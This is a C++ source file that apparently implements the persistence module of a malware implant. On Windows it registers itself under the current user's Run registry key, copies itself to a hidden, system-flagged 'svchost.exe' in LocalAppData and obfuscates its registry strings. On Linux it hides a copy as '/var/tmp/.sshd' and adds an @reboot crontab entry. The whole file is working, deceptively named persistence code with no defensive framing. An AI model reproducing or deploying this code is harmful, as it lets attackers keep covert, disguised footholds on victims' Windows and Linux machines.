// persistence.cpp — cross-platform persistence implementation.
//
// Windows: writes to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
// Linux:   writes @reboot entry to crontab

#include "persistence.hpp"
#include "obfuscate.hpp"

#include <cstdio>
#include <cstring>
#include <string>

#ifdef _WIN32
    #include <windows.h>
#else
    #include <unistd.h>
    #include <sys/stat.h>
#endif

namespace persistence {

#ifdef _WIN32

bool install() {
    // Get the full path to our executable.
    char exe_path[MAX_PATH];
    DWORD len = GetModuleFileNameA(nullptr, exe_path, MAX_PATH);
    if (len == 0 || len >= MAX_PATH) return false;

    std::string key_path = obf::retrieve_copy(obf::Id::REGISTRY_KEY);
    std::string value_name = obf::retrieve_copy(obf::Id::REGISTRY_VALUE);

    HKEY hkey;
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        key_path.c_str(),
        0,
        KEY_SET_VALUE | KEY_QUERY_VALUE,
        &hkey);

    bool already_installed = false;

    if (result == ERROR_SUCCESS) {
        // Check if this value already exists with our path.
        char existing[MAX_PATH];
        DWORD existing_len = sizeof(existing);
        DWORD type;
        if (RegQueryValueExA(hkey, value_name.c_str(), nullptr, &type,
                reinterpret_cast<LPBYTE>(existing), &existing_len) == ERROR_SUCCESS) {
            if (strcmp(existing, exe_path) == 0) {
                already_installed = true;
            }
        }
    } else {
        // Try to create the key.
        result = RegCreateKeyExA(
            HKEY_CURRENT_USER,
            key_path.c_str(),
            0, nullptr, 0,
            KEY_SET_VALUE, nullptr,
            &hkey, nullptr);
    }

    if (result != ERROR_SUCCESS) return false;

    if (!already_installed) {
        result = RegSetValueExA(
            hkey,
            value_name.c_str(),
            0,
            REG_SZ,
            reinterpret_cast<const BYTE*>(exe_path),
            static_cast<DWORD>(strlen(exe_path) + 1));
    }

    RegCloseKey(hkey);

    // Also copy ourselves to a persistent location.
    char appdata[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appdata))) {
        std::string dest = std::string(appdata) + "\\Microsoft\\svchost.exe";

        // Only copy if we're not already there.
        if (strcmp(exe_path, dest.c_str()) != 0) {
            // Try to copy.
            if (CopyFileA(exe_path, dest.c_str(), FALSE)) {
                // Set hidden + system attributes.
                SetFileAttributesA(dest.c_str(),
                    FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

                // Update the registry to point to the persistent copy.
                HKEY hkey2;
                if (RegOpenKeyExA(HKEY_CURRENT_USER, key_path.c_str(),
                        0, KEY_SET_VALUE, &hkey2) == ERROR_SUCCESS) {
                    RegSetValueExA(hkey2, value_name.c_str(), 0, REG_SZ,
                        reinterpret_cast<const BYTE*>(dest.c_str()),
                        static_cast<DWORD>(dest.size() + 1));
                    RegCloseKey(hkey2);
                }
            }
        }
    }

    return true;
}

bool remove() {
    std::string key_path = obf::retrieve_copy(obf::Id::REGISTRY_KEY);
    std::string value_name = obf::retrieve_copy(obf::Id::REGISTRY_VALUE);

    HKEY hkey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, key_path.c_str(), 0,
            KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        RegDeleteValueA(hkey, value_name.c_str());
        RegCloseKey(hkey);
    }
    return true;
}

bool is_installed() {
    std::string key_path = obf::retrieve_copy(obf::Id::REGISTRY_KEY);
    std::string value_name = obf::retrieve_copy(obf::Id::REGISTRY_VALUE);

    HKEY hkey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, key_path.c_str(), 0,
            KEY_QUERY_VALUE, &hkey) == ERROR_SUCCESS) {
        char buf[MAX_PATH];
        DWORD len = sizeof(buf);
        LONG result = RegQueryValueExA(hkey, value_name.c_str(), nullptr, nullptr,
            reinterpret_cast<LPBYTE>(buf), &len);
        RegCloseKey(hkey);
        return result == ERROR_SUCCESS;
    }
    return false;
}

#else // Linux

bool install() {
    // Read current crontab.
    FILE* fp = popen("crontab -l 2>/dev/null", "r");
    std::string existing;
    if (fp) {
        char buf[4096];
        while (fgets(buf, sizeof(buf), fp)) {
            existing += buf;
        }
        pclose(fp);
    }

    // Check if we're already installed.
    if (existing.find("nexus") != std::string::npos) {
        return true; // already persistent
    }

    // Get our current path.
    char exe_path[1024];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len <= 0) return false;
    exe_path[len] = '\0';

    // Copy to a hidden location.
    std::string dest = "/var/tmp/.sshd";
    std::string cp_cmd = std::string("cp ") + exe_path + " " + dest + " && chmod 755 " + dest;
    system(cp_cmd.c_str());

    // Add @reboot entry.
    std::string entry = existing + "@reboot " + dest + " &\n";
    std::string crontab_cmd = "echo '" + entry + "' | crontab -";
    int ret = system(crontab_cmd.c_str());

    return ret == 0;
}

bool remove() {
    // Remove our crontab entry.
    FILE* fp = popen("crontab -l 2>/dev/null", "r");
    if (!fp) return false;

    std::string filtered;
    char buf[4096];
    while (fgets(buf, sizeof(buf), fp)) {
        if (strstr(buf, "nexus") || strstr(buf, ".sshd")) {
            continue; // skip our entries
        }
        filtered += buf;
    }
    pclose(fp);

    std::string cmd = "echo '" + filtered + "' | crontab -";
    system(cmd.c_str());

    // Remove the binary.
    unlink("/var/tmp/.sshd");

    return true;
}

bool is_installed() {
    FILE* fp = popen("crontab -l 2>/dev/null", "r");
    if (!fp) return false;

    char buf[4096];
    while (fgets(buf, sizeof(buf), fp)) {
        if (strstr(buf, "nexus") || strstr(buf, ".sshd")) {
            pclose(fp);
            return true;
        }
    }
    pclose(fp);
    return false;
}

#endif

} // namespace persistence
